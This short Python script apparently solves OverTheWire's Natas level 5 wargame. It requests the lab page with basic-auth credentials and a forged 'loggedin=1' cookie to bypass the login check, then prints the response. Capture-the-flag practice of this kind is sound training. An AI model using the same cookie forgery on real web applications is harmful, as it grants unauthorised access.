import requests

res = requests.get(
    url="http://natas5.natas.labs.overthewire.org/",
    headers={"Cookie": "loggedin=1"},
    auth=("natas5", "0n...oK"),
)

print(res.text)
